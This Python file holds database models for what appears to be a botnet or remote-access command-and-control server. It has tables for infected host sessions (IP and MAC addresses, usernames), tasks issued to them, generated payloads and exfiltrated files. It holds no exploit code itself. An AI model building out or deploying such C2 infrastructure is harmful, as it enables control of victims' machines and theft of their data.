from datetime import datetime
from flask_login import UserMixin, LoginManager
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
login_manager = LoginManager()

@login_manager.user_loader
def load_user(user_id):
	return User.query.get(int(user_id))

class User(db.Model, UserMixin):
	id = db.Column(db.Integer, primary_key=True)
	username = db.Column(db.String(32), unique=True, nullable=False)
	password = db.Column(db.String(60), nullable=False)
	joined = db.Column(db.DateTime, default=datetime.utcnow(), nullable=False)
	bots = db.Column(db.Integer, default=0)
	sessions = db.relationship('Session', backref='creator', lazy=True)
	payloads = db.relationship('Payload', backref='creator', lazy=True)
	files = db.relationship('ExfiltratedFile', backref='creator', lazy=True)

	def __repr__(self):
		return "User('{}')".format(self.username)

class Session(db.Model):
	id = db.Column(db.Integer, nullable=False)
	uid = db.Column(db.String(32), primary_key=True, unique=True, nullable=False)
	online = db.Column(db.Boolean, nullable=False)
	joined = db.Column(db.DateTime, nullable=False)
	public_ip = db.Column(db.String(42))
	local_ip = db.Column(db.String(42))
	mac_address = db.Column(db.String(17))
	username = db.Column(db.String(32))
	new = db.Column(db.Boolean, default=True, nullable=False)
	owner = db.Column(db.String(120), db.ForeignKey('user.username'), nullable=False)
	tasks = db.relationship('Task', backref='issuer', lazy=True)

	def __repr__(self):
		return "Session('{0}', '{1}')".format(self.id, self.owner)

	def serialize(self):
		return {
			"id": self.id,
			"uid": self.uid,
			"online": self.online,
			"joined": self.joined.__str__(),
			"public_ip": self.public_ip,
			"local_ip": self.local_ip,
			"mac_address": self.mac_address,
			"username": self.username,
			"owner": self.owner
		}

class Task(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	uid = db.Column(db.String(32), unique=True, nullable=False)
	task = db.Column(db.Text)
	result = db.Column(db.Text)
	issued = db.Column(db.DateTime, nullable=False, default=datetime.utcnow())
	completed = db.Column(db.DateTime)
	session = db.Column(db.String(32), db.ForeignKey('session.uid'), nullable=False)

	def __repr__(self):
		return "Task('{0}', '{1}')".format(self.id, self.task)

	def serialize(self):
		return {
			"id": self.id,
			"uid": self.uid,
			"task": self.task,
			"result": self.result,
			"issued": self.issued.__str__(),
			"completed": self.completed.__str__()
		}

class Payload(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	filename = db.Column(db.String(34), unique=True, nullable=False)
	format = db.Column(db.String(10), nullable=False)
	created = db.Column(db.DateTime, nullable=False, default=datetime.utcnow())
	owner = db.Column(db.String(120), db.ForeignKey('user.username'), nullable=False)

	def __repr__(self):
		return "Payload('{0}', '{1}')".format(self.filename, self.owner)

	def serialize(self):
		return {
			"id": self.id,
			"filename": self.filename,
			"created": self.created
		}

class ExfiltratedFile(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	filename = db.Column(db.String(34), unique=True, nullable=False)
	session = db.Column(db.String(15), nullable=False)
	module = db.Column(db.String(15), nullable=False)
	created = db.Column(db.DateTime, nullable=False, default=datetime.utcnow())
	owner = db.Column(db.String(120), db.ForeignKey('user.username'), nullable=False)

	def __repr__(self):
		return "ExfiltratedFile('{0}', '{1}')".format(self.filename, self.owner)

	def serialize(self):
		return {
			"id": self.id,
			"filename": self.filename,
			"session": self.session,
			"module": self.module,
			"created": self.created
		}
